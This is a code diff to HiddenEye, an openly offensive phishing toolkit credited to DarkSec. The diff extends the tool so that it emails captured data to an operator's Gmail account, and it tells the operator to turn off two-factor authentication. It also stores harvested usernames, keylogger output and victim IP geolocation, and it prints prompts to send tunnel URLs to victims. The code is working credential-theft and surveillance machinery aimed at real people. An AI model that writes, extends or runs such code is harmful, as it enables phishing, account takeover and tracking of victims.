@@ -1,5 +1,6 @@
 #Any actions must be here
 
+import getpass
 from os import system, path
 from distutils.dir_util import copy_tree
 from time import sleep
@@ -162,13 +163,25 @@ def selectServer(port): #Question where user must select server
 
         choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
         if choice == '1':
+            system('clear')
+            runNgrok(port)
+        elif choice == '2':
+            system('clear')
+            runServeo(port)
+        elif choice == '3':
+            system('clear')
+            runLocalxpose(port)    
 
+        else:
+            system('clear')
+            return selectServer(port)
+def runNgrok(port):
             print(_('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ NGROK SERVER PROCEDURE ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ NGROK SERVER ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
             
             system('./Server/ngrok http {} > /dev/null &'.format(port))
             while True:
@@ -181,18 +194,7 @@ def selectServer(port): #Question where user must select server
                     print(_("\n{0}[{1}!{0}]{1} SEND THIS NGROK URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} NGROK URL: {2}".format(MAIN0, MAIN2, MAIN3, port) + url + "{1}").format(MAIN0, MAIN4, MAIN3))
                     print("\n")  
                     break
-
-        elif choice == '2':
-            system('clear')
-            runServeo(port)
-        elif choice == '3':
-            system('clear')
-            runLocalxpose(port)    
-
-        else:
-            system('clear')
-            return selectServer(port)
-
+                    
 def runLocalxpose(port):
     print(_('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
@@ -581,7 +583,81 @@ def inputCustom(): #Question where user can input custom web-link
          f.write(c)
          f.close()
 
+def emailPrompt():
+	system('clear')
+	print (_('''{1}
+        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        {1}http://github.com/darksecdevelopers
+        {0}** BY: {1}DARKSEC {0}**
+''').format(MAIN0, MAIN2))
+	print(_("-------------------------------\n{0}[ PROMPT: NEED CAPTURED DATA TO EMAIL ? ]{1}!! {0}\n-------------------------------").format(MAIN0, MAIN4))
+	addingEmail()
+	
+def addingEmail():
+        print(_("\n{0}[{1}!{0}]{1}No Need To Configure, If you have Already Done. ").format(MAIN0, MAIN4))
+        print(_("\n{0}[{1}*{0}]{0}DO YOU WANT CAPTURED DATA TO BE EMAILED, THEN CREATE CONFIG FILE -{1}(Y/N)").format(MAIN0, MAIN4))
+        choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4,MAIN2))
+        if choice == 'y' or choice == 'Y':
+            print(_("\n{0}[{1}!{0}] BEFORE STARTING MAKE SURE THESE THINGS: \n\n{0}[{1}+{0}] {1}YOU HAVE CORRECT GMAIL USERNAME & PASSWORD\n{0}[{1}+{0}] {1}YOU HAVE DISABLED 2-FACTOR AUTHENTICATION FROM YOUR GMAIL ACCOUNT\n{0}[{1}+{0}] {1}YOU HAVE TURNED ON LESS SECURED APPS \n    (https://myaccount.google.com/lesssecureapps) \n\n").format(MAIN0, MAIN4))
+            input('[.] Press Enter To Start Configuring Gmail Credential File...')
+            emailPrompt2()
+        else:
+            print('[ERROR] Please choose correct option to continue !')
+            sleep(1)
+            emailPrompt()
+            
+
+def emailPrompt2():
+	system('clear')
+	print (_('''{1}
+        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        {1}http://github.com/darksecdevelopers
+        {0}** BY: {1}DARKSEC {0}**
+''').format(MAIN0, MAIN2))
+	print(_("-------------------------------\n{0}[ PROMPT: CONFIG EMAIL CREDENTIAL FILE ]{1}!! {0}\n-------------------------------").format(MAIN0, MAIN4))
+	emailConfig()
+	
+def emailConfig ():
+    system('cp Defs/Send_Email/EmailConfigDefault.py Defs/Send_Email/emailconfig.py')
+    GMAILACCOUNT=input("[+] Enter Your Gmail Username: ")
+    with open('Defs/Send_Email/emailconfig.py') as f:
+        read_data = f.read()
+        c = read_data.replace('GMAILACCOUNT',GMAILACCOUNT)
+        f = open('Defs/Send_Email/emailconfig.py', 'w')
+        f.write(c)
+        f.close()
+        print('')
+        print("[.] ADDED EMAIL TO CONFIG FILE !")
+        print('')
+        
+    GMAILPASSWORD=getpass.getpass("[+] Enter Your Gmail Password: ")
+    with open('Defs/Send_Email/emailconfig.py') as f:
+        read_data = f.read()
+        c = read_data.replace('GMAILPASSWORD',GMAILPASSWORD)
+        f = open('Defs/Send_Email/emailconfig.py', 'w')
+        f.write(c)
+        f.close()
+        print('')
+        print("[.] ADDED PASSWORD TO CONFIG FILE !")
+        print('')
+    RECIPIENTEMAIL=input("[+] Enter Recipient Email: ")
+    with open('Defs/Send_Email/emailconfig.py') as f:
+        read_data = f.read()
+        c = read_data.replace('RECIPIENTEMAIL',RECIPIENTEMAIL)
+        f = open('Defs/Send_Email/emailconfig.py', 'w')
+        f.write(c)
+        f.close()
+        print('')
+        print("[.] ADDED RECIPIENT EMAIL TO CONFIG FILE !")
+        print('')
+        print('[SUCCESS]: Created Config File To (Defs/Send_Email/Config.py)')  
+
 def cloudfarePrompt():
+	
 	system('clear')
 	print (_('''{1}
         _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
@@ -591,6 +667,7 @@ def cloudfarePrompt():
         {0}** BY: {1}DARKSEC {0}**
 ''').format(MAIN0, MAIN2))
 	print(_("-------------------------------\n{0}[ CLOUDFARE PROTECTION PROMPT ]{1}!! {0}\n-------------------------------").format(MAIN0, MAIN4))
+	addingCloudfare()
 	
 def addingCloudfare():
         print(_("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A CLOUDFARE PROTECTION FAKE PAGE -{1}(Y/N)").format(MAIN0, MAIN4))
@@ -652,10 +729,17 @@ def runServer(port):
 
 
 def endMessage(): #Message when HiddenEye exit
-        choice = input("\n\n{0}[{1}?{0}] Press '1' To Run Script Again {1}|{0} Press 'ENTER' To Exit\n{0} >> {2}".format(MAIN0, MAIN4, MAIN2))
+        choice = input("\n\n{0}[{1}?{0}] SELECT ANY ONE OPTION(1/2/3):\n\n{0}[{1}1{0}] Send Captured Data To Email \n{0}[{1}2{0}] Launch Script Again\n{0}[{1}3{0}]{0} EXIT SCRIPT \n >> {2}".format(MAIN0, MAIN4, MAIN2))
         if choice == '1':
+           if path.isfile('Defs/Send_Email/emailconfig.py') == True:
+               system('python3 Defs/Send_Email/SendEmail.py')
+           else:
+               print('[ERROR!]: NO CONFIG FILE FOUND ! PLEASE CREATE CONFIG FILE FIRST TO USE THIS OPTION.')
+               return endMessage()
+				   
+        elif choice == '2':
            system('sudo python3 HiddenEye.py')
-        elif choice == '':
+        elif choice == '3':
             system('clear')
             print (_('''
                   {3}HIDDEN EYE {3}BY: DARKSEC TEAM
@@ -684,7 +768,7 @@ def getCredentials(port):
             if len(lines) != 0:
                 writeLog('{0}..................................................................'.format(MAIN3, MAIN4))
                 writeLog(_(' {0}[{1} CREDENTIALS FOUND {0}]{1}:\n {0}{2}{1}').format(MAIN2, MAIN3, lines))
-                system('cp Server/www/usernames.txt Server/CapturedData/usernames.txt && rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
+                system('cp Server/www/usernames.txt Server/CapturedData/usernames.txt && cp Server/CapturedData/usernames.txt usernames.txt && rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
                 writeLog('{0}..................................................................'.format(MAIN3, MAIN4))
 
         creds.close()
@@ -698,8 +782,8 @@ def getCredentials(port):
                 resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
                 ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
                 if 'bogon' in ipinfo:
-                    log('..................................................................'.format(MAIN0, MAIN4))
-                    log(_(' \n{0}[ VICTIM IP BONUS ]{1}:\n {0}{2}{1}').format(MAIN0, MAIN2, lines))
+                    print('..................................................................'.format(MAIN0, MAIN4))
+                    print(_(' \n{0}[ VICTIM IP BONUS ]{1}:\n {0}{2}{1}').format(MAIN0, MAIN2, lines))
                 else:
                     matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
                     latitude = matchObj.group(1)
@@ -709,7 +793,7 @@ def getCredentials(port):
                     writeLog(_(' \n{0}Longitude: {2} \nLatitude: {3}{1}').format(MAIN3, MAIN2, longitude, latitude))
                     writeLog(_(' \n{0}ISP: {2} \nCountry: {3}{1}').format(MAIN3, MAIN2, ipinfo['org'], ipinfo['country']))
                     writeLog(_(' \n{0}Region: {2} \nCity: {3}{1}').format(MAIN3, MAIN2, ipinfo['region'], ipinfo['city']))
-                system('cp Server/www/ip.txt Server/CapturedData/ip.txt && rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
+                system('cp Server/www/ip.txt Server/CapturedData/ip.txt && cp Server/CapturedData/ip.txt ip.txt && rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
                 writeLog('..................................................................'.format(MAIN0, MAIN4))
 
         creds.close()
@@ -719,7 +803,7 @@ def getCredentials(port):
             if len(lines) != 0:
                 writeLog('{0}...............................'.format(MAIN0, MAIN4))
                 writeLog(_(' {1}[{0} GETTING PRESSED KEYS {1}]{1}:\n {0}%s{1}').format(MAIN3, MAIN2) % lines)
-                system('cp Server/www/KeyloggerData.txt Server/CapturedData/KeyloggerData.txt && rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
+                system('cp Server/www/KeyloggerData.txt Server/CapturedData/KeyloggerData.txt && cp Server/CapturedData/KeyloggerData.txt KeyloggerData.txt && rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
                 writeLog('{0}...............................'.format(MAIN0, MAIN4))
 
 
